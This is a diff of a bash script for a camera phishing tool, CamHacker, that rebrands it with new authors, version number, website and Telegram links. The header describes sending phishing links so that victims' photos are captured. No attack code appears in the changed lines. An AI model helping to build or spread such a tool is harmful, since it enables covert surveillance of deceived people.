@@ -1,14 +1,14 @@
 #!/bin/bash
 
 # CamHacker
-# Version    : 1.2.5
-# Description: CamHacker is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
-# Author     : KasRoudra
-# Github     : https://github.com/KasRoudra
-# Email      : kasroudrakrd@gmail.com
-# Credits    : Noob-Hackers, TechChipNet, LinuxChoice
-# Date       : 5-09-2021
-# Language   : Shell
+# Version    : 2.1
+# Description: CameraHackHack is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
+# Author     : KasRoudra, SUMAN, Online Hacking
+# Github     : https://github.com/OnlineHacKing/
+# Email      : info@onlinehacking.in
+# Credits    : Noob-Hackers, TechChipNet, LinuxChoice, CamHacker
+# Date       : 21-04-2022
+# Language   : Shell, HTML, Css
 # Portable File
 # If you copy, consider giving credit! We keep our code open source to help others
 
@@ -143,7 +143,7 @@ replacer() {
 stty -echoctl
 
 # Detect UserInterrupt
-trap "echo -e '\n${success}Thanks for using!\n'; exit" 2
+trap "echo -e '\n${success}Thanks for using! Visit Site : onlinehacking.in\n'; exit" 2
 
 # Termux
 if [[ -d /data/data/com.termux/files/home ]]; then
@@ -432,13 +432,13 @@ read option
     elif echo $option | grep -q "x"; then
         clear
         echo -e "$logo"
-        echo -e "$red[ToolName]  ${cyan}  :[CamHacker]
-$red[Version]    ${cyan} :[1.2.5]
+        echo -e "$red[ToolName]  ${cyan}  :[CameraHack]
+$red[Version]    ${cyan} :[2.1]
 $red[Description]${cyan} :[Camera Phishing tool]
-$red[Author]     ${cyan} :[KasRoudra]
-$red[Github]     ${cyan} :[https://github.com/KasRoudra] 
-$red[Messenger]  ${cyan} :[https://m.me/KasRoudra]
-$red[Email]      ${cyan} :[kasroudrakrd@gmail.com]"
+$red[Author]     ${cyan} :[KasRoudra, Suman, OnlineHacking]
+$red[Github]     ${cyan} :[https://github.com/OnlineHacKing] 
+$red[Website]    ${cyan} :[https://www.onlinehacking.in/]
+$red[Telegarm]   ${cyan} :[https://t.me/onlinehacking]"
 printf "${cyan}\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
 read about
     elif echo $option | grep -q "m"; then
